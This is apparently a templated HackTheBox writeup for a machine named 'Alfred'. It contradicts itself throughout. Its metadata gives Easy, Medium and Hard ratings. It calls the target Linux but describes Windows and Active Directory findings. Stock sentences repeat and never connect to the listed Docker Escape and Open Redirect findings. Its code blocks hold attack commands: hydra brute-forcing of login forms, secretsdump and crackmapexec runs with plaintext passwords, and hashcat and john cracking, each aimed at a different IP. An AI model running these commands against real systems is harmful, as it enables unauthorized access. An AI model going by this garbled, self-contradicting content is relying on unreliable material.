---
TitleSEO: "HackTheBox — Alfred (Easy Linux) | ZureFX"
TitlePost: "HackTheBox — Alfred (Easy Linux)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Alfred. Docker Escape and Open Redirect to achieve easy compromise on Linux."
Keywords: "reversing, hackthebox, medium, ctf, linux, hard"
URL: "https://zurefx.github.io/writeups/htb-alfred-427.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-alfred-427/"
Date: "2024-06-06"
Tags: "Reversing, HackTheBox, Medium, CTF, Linux, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-alfred-427"
Permalink: "/writeups/htb-alfred-427.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Alfred** is rated **Easy** on HackTheBox. It runs **Linux** and the IP address during this analysis was `10.91.139.59`.

### Objectives

Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

### Service Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.77.117.47
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.17.160.35 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.2.240 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.28.144.197 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI).

### SMB Enumeration

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

## Exploitation

### Vulnerability Identification

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

Key finding: **Docker Escape**.

The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
crackmapexec smb 10.42.135.106 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.21.193.38 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
feroxbuster -h
```

### Exploitation

Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

```bash
gobuster dir -u http://10.24.89.113/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.49.23.208/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.43.30.99/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.125.65.215
```

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Summary

### Tools Used

- `evil-winrm`
- `GetNPUsers`
- `sqlmap`
- `secretsdump`
- `smbclient`
- `burpsuite`
- `kerbrute`
- `dcomexec`

### Key Takeaways

- Docker Escape
- Open Redirect
